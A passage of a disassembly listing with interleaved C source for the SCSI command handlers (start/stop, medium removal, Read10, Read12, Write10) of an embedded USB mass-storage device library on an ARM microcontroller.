  if ((params[4] & 0x3U) == 0x1U) /* START=1 */
 800a330:	687b      	ldr	r3, [r7, #4]
 800a332:	3304      	adds	r3, #4
 800a334:	781b      	ldrb	r3, [r3, #0]
 800a336:	f003 0303 	and.w	r3, r3, #3
 800a33a:	2b01      	cmp	r3, #1
 800a33c:	d106      	bne.n	800a34c <SCSI_StartStopUnit+0x74>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a33e:	697b      	ldr	r3, [r7, #20]
 800a340:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a344:	2200      	movs	r2, #0
 800a346:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a34a:	e01a      	b.n	800a382 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x2U) /* START=0 and LOEJ Load Eject=1 */
 800a34c:	687b      	ldr	r3, [r7, #4]
 800a34e:	3304      	adds	r3, #4
 800a350:	781b      	ldrb	r3, [r3, #0]
 800a352:	f003 0303 	and.w	r3, r3, #3
 800a356:	2b02      	cmp	r3, #2
 800a358:	d106      	bne.n	800a368 <SCSI_StartStopUnit+0x90>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_EJECTED;
 800a35a:	697b      	ldr	r3, [r7, #20]
 800a35c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a360:	2202      	movs	r2, #2
 800a362:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a366:	e00c      	b.n	800a382 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x3U) /* START=1 and LOEJ Load Eject=1 */
 800a368:	687b      	ldr	r3, [r7, #4]
 800a36a:	3304      	adds	r3, #4
 800a36c:	781b      	ldrb	r3, [r3, #0]
 800a36e:	f003 0303 	and.w	r3, r3, #3
 800a372:	2b03      	cmp	r3, #3
 800a374:	d105      	bne.n	800a382 <SCSI_StartStopUnit+0xaa>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a376:	697b      	ldr	r3, [r7, #20]
 800a378:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a37c:	2200      	movs	r2, #0
 800a37e:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }
  else
  {
    /* .. */
  }
  hmsc->bot_data_length = 0U;
 800a382:	697b      	ldr	r3, [r7, #20]
 800a384:	2200      	movs	r2, #0
 800a386:	60da      	str	r2, [r3, #12]

  return 0;
 800a388:	2300      	movs	r3, #0
}
 800a38a:	4618      	mov	r0, r3
 800a38c:	3718      	adds	r7, #24
 800a38e:	46bd      	mov	sp, r7
 800a390:	bd80      	pop	{r7, pc}

0800a392 <SCSI_AllowPreventRemovable>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_AllowPreventRemovable(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a392:	b480      	push	{r7}
 800a394:	b087      	sub	sp, #28
 800a396:	af00      	add	r7, sp, #0
 800a398:	60f8      	str	r0, [r7, #12]
 800a39a:	460b      	mov	r3, r1
 800a39c:	607a      	str	r2, [r7, #4]
 800a39e:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a3a0:	68fb      	ldr	r3, [r7, #12]
 800a3a2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a3a6:	68fb      	ldr	r3, [r7, #12]
 800a3a8:	32b0      	adds	r2, #176	; 0xb0
 800a3aa:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a3ae:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a3b0:	697b      	ldr	r3, [r7, #20]
 800a3b2:	2b00      	cmp	r3, #0
 800a3b4:	d102      	bne.n	800a3bc <SCSI_AllowPreventRemovable+0x2a>
  {
    return -1;
 800a3b6:	f04f 33ff 	mov.w	r3, #4294967295
 800a3ba:	e015      	b.n	800a3e8 <SCSI_AllowPreventRemovable+0x56>
  }

  if (params[4] == 0U)
 800a3bc:	687b      	ldr	r3, [r7, #4]
 800a3be:	3304      	adds	r3, #4
 800a3c0:	781b      	ldrb	r3, [r3, #0]
 800a3c2:	2b00      	cmp	r3, #0
 800a3c4:	d106      	bne.n	800a3d4 <SCSI_AllowPreventRemovable+0x42>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a3c6:	697b      	ldr	r3, [r7, #20]
 800a3c8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3cc:	2200      	movs	r2, #0
 800a3ce:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a3d2:	e005      	b.n	800a3e0 <SCSI_AllowPreventRemovable+0x4e>
  }
  else
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_LOCKED;
 800a3d4:	697b      	ldr	r3, [r7, #20]
 800a3d6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3da:	2201      	movs	r2, #1
 800a3dc:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }

  hmsc->bot_data_length = 0U;
 800a3e0:	697b      	ldr	r3, [r7, #20]
 800a3e2:	2200      	movs	r2, #0
 800a3e4:	60da      	str	r2, [r3, #12]

  return 0;
 800a3e6:	2300      	movs	r3, #0
}
 800a3e8:	4618      	mov	r0, r3
 800a3ea:	371c      	adds	r7, #28
 800a3ec:	46bd      	mov	sp, r7
 800a3ee:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a3f2:	4770      	bx	lr

0800a3f4 <SCSI_Read10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a3f4:	b580      	push	{r7, lr}
 800a3f6:	b086      	sub	sp, #24
 800a3f8:	af00      	add	r7, sp, #0
 800a3fa:	60f8      	str	r0, [r7, #12]
 800a3fc:	460b      	mov	r3, r1
 800a3fe:	607a      	str	r2, [r7, #4]
 800a400:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a402:	68fb      	ldr	r3, [r7, #12]
 800a404:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a408:	68fb      	ldr	r3, [r7, #12]
 800a40a:	32b0      	adds	r2, #176	; 0xb0
 800a40c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a410:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a412:	697b      	ldr	r3, [r7, #20]
 800a414:	2b00      	cmp	r3, #0
 800a416:	d102      	bne.n	800a41e <SCSI_Read10+0x2a>
  {
    return -1;
 800a418:	f04f 33ff 	mov.w	r3, #4294967295
 800a41c:	e09d      	b.n	800a55a <SCSI_Read10+0x166>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a41e:	697b      	ldr	r3, [r7, #20]
 800a420:	7a1b      	ldrb	r3, [r3, #8]
 800a422:	2b00      	cmp	r3, #0
 800a424:	f040 808f 	bne.w	800a546 <SCSI_Read10+0x152>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a428:	697b      	ldr	r3, [r7, #20]
 800a42a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a42e:	7f1b      	ldrb	r3, [r3, #28]
 800a430:	b25b      	sxtb	r3, r3
 800a432:	2b00      	cmp	r3, #0
 800a434:	db0b      	blt.n	800a44e <SCSI_Read10+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a436:	697b      	ldr	r3, [r7, #20]
 800a438:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a43c:	7f59      	ldrb	r1, [r3, #29]
 800a43e:	2320      	movs	r3, #32
 800a440:	2205      	movs	r2, #5
 800a442:	68f8      	ldr	r0, [r7, #12]
 800a444:	f7ff feec 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a448:	f04f 33ff 	mov.w	r3, #4294967295
 800a44c:	e085      	b.n	800a55a <SCSI_Read10+0x166>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a44e:	697b      	ldr	r3, [r7, #20]
 800a450:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a454:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a458:	2b02      	cmp	r3, #2
 800a45a:	d108      	bne.n	800a46e <SCSI_Read10+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a45c:	7af9      	ldrb	r1, [r7, #11]
 800a45e:	233a      	movs	r3, #58	; 0x3a
 800a460:	2202      	movs	r2, #2
 800a462:	68f8      	ldr	r0, [r7, #12]
 800a464:	f7ff fedc 	bl	800a220 <SCSI_SenseCode>

      return -1;
 800a468:	f04f 33ff 	mov.w	r3, #4294967295
 800a46c:	e075      	b.n	800a55a <SCSI_Read10+0x166>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a46e:	68fb      	ldr	r3, [r7, #12]
 800a470:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a474:	68fa      	ldr	r2, [r7, #12]
 800a476:	33b0      	adds	r3, #176	; 0xb0
 800a478:	009b      	lsls	r3, r3, #2
 800a47a:	4413      	add	r3, r2
 800a47c:	685b      	ldr	r3, [r3, #4]
 800a47e:	689b      	ldr	r3, [r3, #8]
 800a480:	7afa      	ldrb	r2, [r7, #11]
 800a482:	4610      	mov	r0, r2
 800a484:	4798      	blx	r3
 800a486:	4603      	mov	r3, r0
 800a488:	2b00      	cmp	r3, #0
 800a48a:	d008      	beq.n	800a49e <SCSI_Read10+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a48c:	7af9      	ldrb	r1, [r7, #11]
 800a48e:	233a      	movs	r3, #58	; 0x3a
 800a490:	2202      	movs	r2, #2
 800a492:	68f8      	ldr	r0, [r7, #12]
 800a494:	f7ff fec4 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a498:	f04f 33ff 	mov.w	r3, #4294967295
 800a49c:	e05d      	b.n	800a55a <SCSI_Read10+0x166>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a49e:	687b      	ldr	r3, [r7, #4]
 800a4a0:	3302      	adds	r3, #2
 800a4a2:	781b      	ldrb	r3, [r3, #0]
 800a4a4:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a4a6:	687b      	ldr	r3, [r7, #4]
 800a4a8:	3303      	adds	r3, #3
 800a4aa:	781b      	ldrb	r3, [r3, #0]
 800a4ac:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a4ae:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a4b0:	687b      	ldr	r3, [r7, #4]
 800a4b2:	3304      	adds	r3, #4
 800a4b4:	781b      	ldrb	r3, [r3, #0]
 800a4b6:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a4b8:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a4ba:	687a      	ldr	r2, [r7, #4]
 800a4bc:	3205      	adds	r2, #5
 800a4be:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a4c0:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a4c2:	697a      	ldr	r2, [r7, #20]
 800a4c4:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a4c8:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] <<  8) | (uint32_t)params[8];
 800a4ca:	687b      	ldr	r3, [r7, #4]
 800a4cc:	3307      	adds	r3, #7
 800a4ce:	781b      	ldrb	r3, [r3, #0]
 800a4d0:	021b      	lsls	r3, r3, #8
 800a4d2:	687a      	ldr	r2, [r7, #4]
 800a4d4:	3208      	adds	r2, #8
 800a4d6:	7812      	ldrb	r2, [r2, #0]
 800a4d8:	4313      	orrs	r3, r2
 800a4da:	697a      	ldr	r2, [r7, #20]
 800a4dc:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a4e0:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a4e2:	697b      	ldr	r3, [r7, #20]
 800a4e4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4e8:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a4ea:	697b      	ldr	r3, [r7, #20]
 800a4ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4f0:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a4f2:	7af9      	ldrb	r1, [r7, #11]
 800a4f4:	68f8      	ldr	r0, [r7, #12]
 800a4f6:	f000 fb0c 	bl	800ab12 <SCSI_CheckAddressRange>
 800a4fa:	4603      	mov	r3, r0
 800a4fc:	2b00      	cmp	r3, #0
 800a4fe:	da02      	bge.n	800a506 <SCSI_Read10+0x112>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a500:	f04f 33ff 	mov.w	r3, #4294967295
 800a504:	e029      	b.n	800a55a <SCSI_Read10+0x166>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a506:	697b      	ldr	r3, [r7, #20]
 800a508:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a50c:	699a      	ldr	r2, [r3, #24]
 800a50e:	697b      	ldr	r3, [r7, #20]
 800a510:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a514:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a516:	6979      	ldr	r1, [r7, #20]
 800a518:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a51c:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a520:	fb01 f303 	mul.w	r3, r1, r3
 800a524:	429a      	cmp	r2, r3
 800a526:	d00b      	beq.n	800a540 <SCSI_Read10+0x14c>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a528:	697b      	ldr	r3, [r7, #20]
 800a52a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a52e:	7f59      	ldrb	r1, [r3, #29]
 800a530:	2320      	movs	r3, #32
 800a532:	2205      	movs	r2, #5
 800a534:	68f8      	ldr	r0, [r7, #12]
 800a536:	f7ff fe73 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a53a:	f04f 33ff 	mov.w	r3, #4294967295
 800a53e:	e00c      	b.n	800a55a <SCSI_Read10+0x166>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a540:	697b      	ldr	r3, [r7, #20]
 800a542:	2202      	movs	r2, #2
 800a544:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a546:	697b      	ldr	r3, [r7, #20]
 800a548:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a54c:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a54e:	7afb      	ldrb	r3, [r7, #11]
 800a550:	4619      	mov	r1, r3
 800a552:	68f8      	ldr	r0, [r7, #12]
 800a554:	f000 fb0a 	bl	800ab6c <SCSI_ProcessRead>
 800a558:	4603      	mov	r3, r0
}
 800a55a:	4618      	mov	r0, r3
 800a55c:	3718      	adds	r7, #24
 800a55e:	46bd      	mov	sp, r7
 800a560:	bd80      	pop	{r7, pc}

0800a562 <SCSI_Read12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a562:	b580      	push	{r7, lr}
 800a564:	b086      	sub	sp, #24
 800a566:	af00      	add	r7, sp, #0
 800a568:	60f8      	str	r0, [r7, #12]
 800a56a:	460b      	mov	r3, r1
 800a56c:	607a      	str	r2, [r7, #4]
 800a56e:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a570:	68fb      	ldr	r3, [r7, #12]
 800a572:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a576:	68fb      	ldr	r3, [r7, #12]
 800a578:	32b0      	adds	r2, #176	; 0xb0
 800a57a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a57e:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a580:	697b      	ldr	r3, [r7, #20]
 800a582:	2b00      	cmp	r3, #0
 800a584:	d102      	bne.n	800a58c <SCSI_Read12+0x2a>
  {
    return -1;
 800a586:	f04f 33ff 	mov.w	r3, #4294967295
 800a58a:	e0a7      	b.n	800a6dc <SCSI_Read12+0x17a>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a58c:	697b      	ldr	r3, [r7, #20]
 800a58e:	7a1b      	ldrb	r3, [r3, #8]
 800a590:	2b00      	cmp	r3, #0
 800a592:	f040 8099 	bne.w	800a6c8 <SCSI_Read12+0x166>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a596:	697b      	ldr	r3, [r7, #20]
 800a598:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a59c:	7f1b      	ldrb	r3, [r3, #28]
 800a59e:	b25b      	sxtb	r3, r3
 800a5a0:	2b00      	cmp	r3, #0
 800a5a2:	db0b      	blt.n	800a5bc <SCSI_Read12+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a5a4:	697b      	ldr	r3, [r7, #20]
 800a5a6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5aa:	7f59      	ldrb	r1, [r3, #29]
 800a5ac:	2320      	movs	r3, #32
 800a5ae:	2205      	movs	r2, #5
 800a5b0:	68f8      	ldr	r0, [r7, #12]
 800a5b2:	f7ff fe35 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a5b6:	f04f 33ff 	mov.w	r3, #4294967295
 800a5ba:	e08f      	b.n	800a6dc <SCSI_Read12+0x17a>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a5bc:	697b      	ldr	r3, [r7, #20]
 800a5be:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5c2:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a5c6:	2b02      	cmp	r3, #2
 800a5c8:	d108      	bne.n	800a5dc <SCSI_Read12+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a5ca:	7af9      	ldrb	r1, [r7, #11]
 800a5cc:	233a      	movs	r3, #58	; 0x3a
 800a5ce:	2202      	movs	r2, #2
 800a5d0:	68f8      	ldr	r0, [r7, #12]
 800a5d2:	f7ff fe25 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a5d6:	f04f 33ff 	mov.w	r3, #4294967295
 800a5da:	e07f      	b.n	800a6dc <SCSI_Read12+0x17a>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a5dc:	68fb      	ldr	r3, [r7, #12]
 800a5de:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a5e2:	68fa      	ldr	r2, [r7, #12]
 800a5e4:	33b0      	adds	r3, #176	; 0xb0
 800a5e6:	009b      	lsls	r3, r3, #2
 800a5e8:	4413      	add	r3, r2
 800a5ea:	685b      	ldr	r3, [r3, #4]
 800a5ec:	689b      	ldr	r3, [r3, #8]
 800a5ee:	7afa      	ldrb	r2, [r7, #11]
 800a5f0:	4610      	mov	r0, r2
 800a5f2:	4798      	blx	r3
 800a5f4:	4603      	mov	r3, r0
 800a5f6:	2b00      	cmp	r3, #0
 800a5f8:	d008      	beq.n	800a60c <SCSI_Read12+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a5fa:	7af9      	ldrb	r1, [r7, #11]
 800a5fc:	233a      	movs	r3, #58	; 0x3a
 800a5fe:	2202      	movs	r2, #2
 800a600:	68f8      	ldr	r0, [r7, #12]
 800a602:	f7ff fe0d 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a606:	f04f 33ff 	mov.w	r3, #4294967295
 800a60a:	e067      	b.n	800a6dc <SCSI_Read12+0x17a>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a60c:	687b      	ldr	r3, [r7, #4]
 800a60e:	3302      	adds	r3, #2
 800a610:	781b      	ldrb	r3, [r3, #0]
 800a612:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a614:	687b      	ldr	r3, [r7, #4]
 800a616:	3303      	adds	r3, #3
 800a618:	781b      	ldrb	r3, [r3, #0]
 800a61a:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a61c:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a61e:	687b      	ldr	r3, [r7, #4]
 800a620:	3304      	adds	r3, #4
 800a622:	781b      	ldrb	r3, [r3, #0]
 800a624:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a626:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a628:	687a      	ldr	r2, [r7, #4]
 800a62a:	3205      	adds	r2, #5
 800a62c:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a62e:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a630:	697a      	ldr	r2, [r7, #20]
 800a632:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a636:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a638:	687b      	ldr	r3, [r7, #4]
 800a63a:	3306      	adds	r3, #6
 800a63c:	781b      	ldrb	r3, [r3, #0]
 800a63e:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a640:	687b      	ldr	r3, [r7, #4]
 800a642:	3307      	adds	r3, #7
 800a644:	781b      	ldrb	r3, [r3, #0]
 800a646:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a648:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a64a:	687b      	ldr	r3, [r7, #4]
 800a64c:	3308      	adds	r3, #8
 800a64e:	781b      	ldrb	r3, [r3, #0]
 800a650:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a652:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a654:	687a      	ldr	r2, [r7, #4]
 800a656:	3209      	adds	r2, #9
 800a658:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a65a:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a65c:	697a      	ldr	r2, [r7, #20]
 800a65e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a662:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a664:	697b      	ldr	r3, [r7, #20]
 800a666:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a66a:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a66c:	697b      	ldr	r3, [r7, #20]
 800a66e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a672:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a674:	7af9      	ldrb	r1, [r7, #11]
 800a676:	68f8      	ldr	r0, [r7, #12]
 800a678:	f000 fa4b 	bl	800ab12 <SCSI_CheckAddressRange>
 800a67c:	4603      	mov	r3, r0
 800a67e:	2b00      	cmp	r3, #0
 800a680:	da02      	bge.n	800a688 <SCSI_Read12+0x126>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a682:	f04f 33ff 	mov.w	r3, #4294967295
 800a686:	e029      	b.n	800a6dc <SCSI_Read12+0x17a>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a688:	697b      	ldr	r3, [r7, #20]
 800a68a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a68e:	699a      	ldr	r2, [r3, #24]
 800a690:	697b      	ldr	r3, [r7, #20]
 800a692:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a696:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a698:	6979      	ldr	r1, [r7, #20]
 800a69a:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a69e:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a6a2:	fb01 f303 	mul.w	r3, r1, r3
 800a6a6:	429a      	cmp	r2, r3
 800a6a8:	d00b      	beq.n	800a6c2 <SCSI_Read12+0x160>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a6aa:	697b      	ldr	r3, [r7, #20]
 800a6ac:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6b0:	7f59      	ldrb	r1, [r3, #29]
 800a6b2:	2320      	movs	r3, #32
 800a6b4:	2205      	movs	r2, #5
 800a6b6:	68f8      	ldr	r0, [r7, #12]
 800a6b8:	f7ff fdb2 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a6bc:	f04f 33ff 	mov.w	r3, #4294967295
 800a6c0:	e00c      	b.n	800a6dc <SCSI_Read12+0x17a>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a6c2:	697b      	ldr	r3, [r7, #20]
 800a6c4:	2202      	movs	r2, #2
 800a6c6:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a6c8:	697b      	ldr	r3, [r7, #20]
 800a6ca:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a6ce:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a6d0:	7afb      	ldrb	r3, [r7, #11]
 800a6d2:	4619      	mov	r1, r3
 800a6d4:	68f8      	ldr	r0, [r7, #12]
 800a6d6:	f000 fa49 	bl	800ab6c <SCSI_ProcessRead>
 800a6da:	4603      	mov	r3, r0
}
 800a6dc:	4618      	mov	r0, r3
 800a6de:	3718      	adds	r7, #24
 800a6e0:	46bd      	mov	sp, r7
 800a6e2:	bd80      	pop	{r7, pc}

0800a6e4 <SCSI_Write10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a6e4:	b580      	push	{r7, lr}
 800a6e6:	b086      	sub	sp, #24
 800a6e8:	af00      	add	r7, sp, #0
 800a6ea:	60f8      	str	r0, [r7, #12]
 800a6ec:	460b      	mov	r3, r1
 800a6ee:	607a      	str	r2, [r7, #4]
 800a6f0:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a6f2:	68fb      	ldr	r3, [r7, #12]
 800a6f4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a6f8:	68fb      	ldr	r3, [r7, #12]
 800a6fa:	32b0      	adds	r2, #176	; 0xb0
 800a6fc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a700:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a702:	697b      	ldr	r3, [r7, #20]
 800a704:	2b00      	cmp	r3, #0
 800a706:	d102      	bne.n	800a70e <SCSI_Write10+0x2a>
  {
    return -1;
 800a708:	f04f 33ff 	mov.w	r3, #4294967295
 800a70c:	e0c7      	b.n	800a89e <SCSI_Write10+0x1ba>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a70e:	697b      	ldr	r3, [r7, #20]
 800a710:	7a1b      	ldrb	r3, [r3, #8]
 800a712:	2b00      	cmp	r3, #0
 800a714:	f040 80bd 	bne.w	800a892 <SCSI_Write10+0x1ae>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a718:	697b      	ldr	r3, [r7, #20]
 800a71a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a71e:	699b      	ldr	r3, [r3, #24]
 800a720:	2b00      	cmp	r3, #0
 800a722:	d10b      	bne.n	800a73c <SCSI_Write10+0x58>
    {
